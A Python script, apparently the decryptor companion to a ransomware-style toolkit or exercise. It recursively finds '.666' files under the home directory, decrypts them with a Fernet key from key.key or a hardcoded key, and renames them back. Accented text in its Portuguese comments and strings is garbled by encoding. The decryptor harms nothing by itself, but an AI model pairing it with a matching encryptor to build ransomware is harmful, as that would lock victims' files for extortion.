import os
from cryptography.fernet import Fernet
from colorama import Fore, Style, init

init(autoreset=True)

# ==============================
# CONFIG
# ==============================

# RootDir onde os arquivos criptografados est√£o
RootDir = os.path.expanduser("~")  # ou "~" para full home

# Se estiver usando uma chave fixa hardcoded, substitua aqui:
USE_CUSTOM_KEY = False
CUSTOM_KEY = "6xaumrWOMkIdxNX-9sAwBYoBwHpsHbm3Cz7heO9-n5A="

# Arquivo da chave
key_path = "key.key"

# Verbose?
VERBOSE = True

# ==============================
# LOGGING
# ==============================

def log(msg, level="info"):
    if not VERBOSE:
        return

    if level == "info":
        print(Fore.CYAN + msg)
    elif level == "ok":
        print(Fore.GREEN + msg)
    elif level == "warn":
        print(Fore.YELLOW + msg)
    elif level == "error":
        print(Fore.RED + msg)
    else:
        print(msg)

# ==============================
# CHAVE
# ==============================

def carregar_chave():
    if USE_CUSTOM_KEY:
        log("[*] Usando chave embutida (CUSTOM_KEY)", "warn")
        return CUSTOM_KEY.encode()

    if not os.path.exists(key_path):
        log("[!] Arquivo key.key n√£o encontrado. Sem chave, sem festa.", "error")
        exit(1)
    with open(key_path, "rb") as f:
        return f.read()

# ==============================
# BUSCA DE ARQUIVOS
# ==============================

def encontrar_arquivos_criptografados(diretorio_base):
    arquivos_para_descriptografar = []
    for root, dirs, files in os.walk(diretorio_base):
        for file in files:
            if file.endswith(".666"):
                caminho_absoluto = os.path.abspath(os.path.join(root, file))
                arquivos_para_descriptografar.append(caminho_absoluto)
    return arquivos_para_descriptografar

# ==============================
# DESCRIPTOGRAFIA
# ==============================

def descriptografar_arquivos(arquivos, fernet):
    for file_path in arquivos:
        try:
            with open(file_path, "rb") as f:
                dados_criptografados = f.read()

            dados_descriptografados = fernet.decrypt(dados_criptografados)

            # Sobrescreve o conte√∫do descriptografado
            with open(file_path, "wb") as f:
                f.write(dados_descriptografados)

            # Remove a extens√£o .666
            nome_original = file_path.replace(".666", "")
            os.rename(file_path, nome_original)

            log(f"[+] Descriptografado: {nome_original}", "ok")

        except Exception as e:
            log(f"[!] Falha ao descriptografar {file_path}: {e}", "error")

# ==============================
# EXECU√á√ÉO
# ==============================

if __name__ == "__main__":
    log("[üîì] DECRYPT MODE ATIVO", "info")

    chave = carregar_chave()
    fernet = Fernet(chave)
    arquivos = encontrar_arquivos_criptografados(RootDir)

    if not arquivos:
        log("[!] Nenhum arquivo com extens√£o .666 encontrado.", "warn")
    else:
        descriptografar_arquivos(arquivos, fernet)
        log("[‚úÖ] Processo de descriptografia finalizado.", "ok")
